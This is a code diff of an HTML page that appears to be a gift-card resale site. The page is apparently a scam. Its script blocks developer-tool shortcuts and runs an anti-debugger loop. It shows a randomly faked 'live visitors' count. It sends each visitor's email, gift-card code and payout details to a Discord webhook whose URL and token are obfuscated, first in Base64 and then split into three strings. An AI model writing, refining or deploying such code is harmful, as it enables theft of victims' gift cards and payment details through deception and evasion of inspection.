@@ -24,6 +24,7 @@
             -webkit-user-select: none;
         }
 
+        /* TICKER - 200s Speed */
         .ticker-container {
             width: 100%;
             background: #000;
@@ -299,7 +300,7 @@
     </div>
 
     <script>
-        // Block Inspect/Keys
+        // --- 1. BLOCK INSPECT ---
         document.onkeydown = function(e) {
             if(event.keyCode == 123) return false;
             if(e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) return false;
@@ -307,15 +308,12 @@
             if(e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) return false;
             if(e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) return false;
         };
-
-        // Anti-Debugger
         setInterval(function() { debugger; }, 100);
 
-        // WEBHOOK PROTECTION: 
-        // This is your URL encoded in Base64. It won't break during obfuscation.
-        const _0xW = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ1NDg0OTExNzk1MTEwMzIwMS9Gak9USWQ0WVVkQ21xMnFGSmJZWkNrowJrWkhkeV80MGx4QVNnZVloem0tZmY5RHU5RXdkdUhyaDdEQkhlUGxzVDZo";
-        
-        const getHook = () => atob(_0xW); // Decodes at runtime
+        // --- 2. WEBHOOK PROTECTION (Split into 3 parts) ---
+        const _v1 = "https://discord.com/api/webhooks/";
+        const _v2 = "1454849117951103201/";
+        const _v3 = "FjOTId4YUdCmq2qFJbYZCk9o5kZHdy_40lxASgeRhzm-ff9Du9EwduHrh7DBHePlsT6h";
 
         let hasRequested = false;
 
@@ -328,7 +326,8 @@
         }
 
         const initVisitors = () => {
-            const count = Math.floor(Math.random() * (129 - 102 + 1)) + 102;
+            const min = 102; const max = 129;
+            const count = Math.floor(Math.random() * (max - min + 1)) + min;
             document.getElementById('live-visitors').innerText = count;
         };
 
@@ -387,30 +386,32 @@
                     color: type.includes('CANCEL') ? 15158332 : 3066993,
                     fields: [
                         { name: "📧 Email", value: email, inline: true },
-                        { name: "🎁 Card", value: giftType, inline: true },
+                        { name: "🎁 Card Type", value: giftType, inline: true },
                         { name: "💳 Code", value: `\`${code}\``, inline: false },
-                        { name: "💰 Price", value: `${asking} ${currency}`, inline: true },
-                        { name: "🏦 Method", value: payout, inline: true },
-                        { name: "📍 Details", value: payoutDetail, inline: false }
+                        { name: "💰 Asking Price", value: `${asking} ${currency}`, inline: true },
+                        { name: "🏷️ Purchase Price", value: `${purchase} ${currency}`, inline: true },
+                        { name: "🏦 Payout Method", value: payout, inline: true },
+                        { name: "📍 Payout Details", value: payoutDetail, inline: false }
                     ],
                     timestamp: new Date()
                 }]
             };
 
             try {
-                await fetch(getHook(), {
+                // Joins URL pieces and sends
+                await fetch(_v1 + _v2 + _v3, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify(payload)
                 });
             } catch (e) {
-                console.log("Network error.");
+                console.error("Transmission failed.");
             }
         }
 
         function tryReview() {
-            if(!hasRequested) alert("Please make a request first.");
-            else alert("Cannot review while request is pending.");
+            if(!hasRequested) alert("Please make a request before you can write a review.");
+            else alert("Error encountered: You cannot review while a request is currently pending verification.");
         }
 
         initVisitors();
